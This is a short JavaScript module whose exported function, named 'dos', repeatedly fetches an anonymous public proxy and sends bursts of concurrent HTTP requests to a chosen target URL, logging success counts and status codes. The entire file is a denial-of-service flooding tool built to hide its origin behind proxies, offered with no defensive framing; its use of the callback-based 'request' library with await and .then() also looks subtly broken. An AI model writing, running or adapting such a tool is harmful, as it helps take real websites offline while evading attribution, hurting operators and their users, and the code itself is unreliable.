const request = require('request');
const proxyUrl = 'http://pubproxy.com/api/proxy?level=anonymous';

const fetchProxy = async (retries = 3) => {
    for (let i = 0; i < retries; i++) {
        try {
            const response = await request(proxyUrl);
            const proxyData = JSON.parse(response).data[0];
            return `${proxyData.ip}:${proxyData.port}`; // Extracting IP and port
        } catch (error) {
            console.error(`Failed to fetch proxy (Attempt ${i + 1}): ${error.message}`);
        }
    }
    throw new Error('Failed to fetch proxy after multiple attempts');
};

const sendRequests = async (targetUrl, proxy, qty) => {
    let err = 0, ok = 0;
    let statusCodes = {};

    const requests = Array.from({ length: qty }, () => 
        request({ url: targetUrl, proxy: `http://${proxy}` })
            .then(response => {
                ok++;
                const statusCode = response.statusCode;
                statusCodes[statusCode] = (statusCodes[statusCode] || 0) + 1;
            })
            .catch(() => {
                err++;
            })
    );

    await Promise.all(requests);

    return { ok, err, statusCodes };
};

const logResults = (counter, targetUrl, results) => {
    const { ok, err, statusCodes } = results;
    const statusCodesString = Object.entries(statusCodes)
        .map(([code, count]) => `${code}: ${count}`)
        .join(', ');

    const timestamp = new Date().toISOString();
    console.log(`[${timestamp}] ${counter}: ${targetUrl} OK: ${ok}, ERR: ${err}, Status Codes: ${statusCodesString}`);
};

const dos = async (targetUrl, qty, ms) => {
    let counter = 1;

    setInterval(async () => {
        try {
            const proxy = await fetchProxy();
            const results = await sendRequests(targetUrl, proxy, qty);
            logResults(counter, targetUrl, results);
        } catch (error) {
            console.error(`Error during DoS operation: ${error.message}`);
        }
        counter++;
    }, ms);
};

module.exports = dos;
